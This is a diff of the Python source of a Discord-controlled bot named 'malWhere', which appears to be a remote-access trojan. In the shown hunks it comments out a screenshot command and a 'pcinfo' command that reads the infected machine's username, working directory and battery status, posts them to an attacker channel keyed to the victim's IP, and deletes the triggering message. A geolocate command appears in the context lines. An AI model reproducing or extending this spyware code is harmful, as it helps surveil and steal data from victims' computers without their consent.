@@ -79,7 +79,7 @@ async def geolocate(ctx):
     await ctx.channel.send("wrong channel skid")
 
 
-#out of order due to replit having issues with xauth and ./xauthority files#
+#commented out due to not working on replit but working on windows
 # @malWhere.command()
 # async def screenshot(ctx):
 #    existing_channel = discord.utils.get(guild.channels, name=ip4chan)
@@ -91,23 +91,23 @@ async def geolocate(ctx):
 #      channel_id = channel.id
 #      mediachan=malWhere.get_channel(channel_id)
 #      mediachan.send(image="tempimage.png")
+
+
+# @malWhere.command()
+# async def pcinfo(ctx):
+#   if str(ctx.channel)==(ip4chan):
+#     battery = psutil.sensors_battery()
+#     plugged = battery.power_plugged
+#     percent = str(battery.percent)
+#     plugged = "Plugged In" if plugged else "Not Plugged In"
+#     embed=discord.Embed(title="PCData", url="", description=f"{ip}'s PC data", color=0xFF5733)
+#     embed.add_field(name="Username", value=getpass.getuser(), inline=False)
+#     embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+#     embed.add_field(name="battery status", value=f"Battery Percentage is {percent}% Battery Plugged in =  {plugged}")
+#     await ctx.send(embed=embed)
+#     await ctx.message.delete()
+#   await ctx.channel.send("wrong channel skid")
 #############################################################################
-
-@malWhere.command()
-async def pcinfo(ctx):
-  if str(ctx.channel)==(ip4chan):
-    battery = psutil.sensors_battery()
-    plugged = battery.power_plugged
-    percent = str(battery.percent)
-    plugged = "Plugged In" if plugged else "Not Plugged In"
-    embed=discord.Embed(title="PCData", url="", description=f"{ip}'s PC data", color=0xFF5733)
-    embed.add_field(name="Username", value=getpass.getuser(), inline=False)
-    embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
-    embed.add_field(name="battery status", value=f"Battery Percentage is {percent}% Battery Plugged in =  {plugged}")
-    await ctx.send(embed=embed)
-    await ctx.message.delete()
-  await ctx.channel.send("wrong channel skid")
-
 @malWhere.command():
 async def rickroll(ctx):
   try:
